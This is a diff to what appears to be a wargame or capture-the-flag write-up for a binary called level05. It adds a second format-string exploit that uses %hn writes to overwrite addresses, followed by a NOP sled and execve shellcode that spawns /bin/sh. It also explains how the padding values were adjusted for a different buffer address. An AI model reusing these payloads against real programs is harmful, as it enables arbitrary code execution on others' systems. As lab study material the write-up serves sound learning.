@@ -126,3 +126,27 @@ to skip the upper bytes.
 ```shell
 (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%056068u%10$hn" + "%09459u%11$hn" + "\x00\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80"'; cat) | ./level05
 ```
+
+> All this works only if the buffer is at the right address but depending on the
+> machine, on the environment, etc..., the address can change. The logic is the
+> same but sometimes it does not work. This has probably something to do with
+> stack alignment when jumping in the buffer. This is still mysterious to me but
+> this is the reason why it is advised to add some noop buffering before the
+> payload, because somehow we can never truly jump on the beginning on the
+> buffer.
+
+Here's an other payload that will work if the buffer address is 0xffffdbd8:
+
+```shell
+(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%056328u%10$hn" + "%09199u%11$hn" + "\x00" + "\x90" * 32 + "\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80"'; cat) | ./level05
+```
+
+Basically to arrive here we took the previous exploit working with the address
+0xffffdae8, substracted it from the new one (which after on the stack). There is
+an offset of 240 bytes. So we added this to the first padding conversion and
+substracted it from the second.
+
+However, as said above, it did not work for some (still) mysterious reason. So
+we repeated the process but with 20 bytes instead of 240 and we added some noop
+padding before the payload so that the jump would be somewhere in this area. And
+it works.
